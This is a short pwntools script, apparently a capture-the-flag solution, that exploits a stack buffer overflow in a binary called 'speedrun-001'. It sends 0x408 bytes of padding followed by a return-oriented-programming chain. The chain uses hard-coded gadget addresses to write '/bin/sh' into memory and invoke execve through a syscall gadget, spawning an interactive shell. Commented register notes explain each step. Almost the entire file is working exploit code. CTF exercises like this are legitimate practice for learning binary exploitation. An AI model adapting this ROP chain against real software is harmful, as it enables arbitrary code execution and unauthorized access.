from pwn import *
context.log_level = "DEBUG"
context.terminal = ['tmux', 'splitw', '-h']

target = process('./speedrun-001')
gdb.attach(target, gdbscript="""b *0x400bad""")


"""
rax:    0x3b (59)            Specify sys_execve
rdi:    ptr to "/bin/sh"     specify file to execute
rsi:    0                    specify no arguments passed
rdx:    0                    specify no environment variables passed
"""

popRax = 0x0000000000415664
popRdi = 0x0000000000400686
popRsi = 0x00000000004101f3
popRdx = 0x000000000044be16

# mov qword ptr [rax], rdx ; ret
movGadget = 0x000000000048d251
ptr_bin_sh = 0x6b6000

syscall = 0x000000000040129c # doesn't have to ret. It's the last gadget

target.recvuntil("Any last words?")

payload = b""
payload += p64(popRax)
payload += p64(ptr_bin_sh)
payload += p64(popRdx)
payload += b"/bin/sh\x00"
payload += p64(movGadget)
payload += p64(popRax)
payload += p64(0x3b) # to indicate we are executing the "execve" syscall
payload += p64(popRdi)
payload += p64(ptr_bin_sh)
payload += p64(popRsi)
payload += p64(0x0)
payload += p64(popRdx)
payload += p64(0x0)

payload += p64(syscall)

payload = (b"0" * 0x408) + payload

target.sendline(payload)
target.interactive()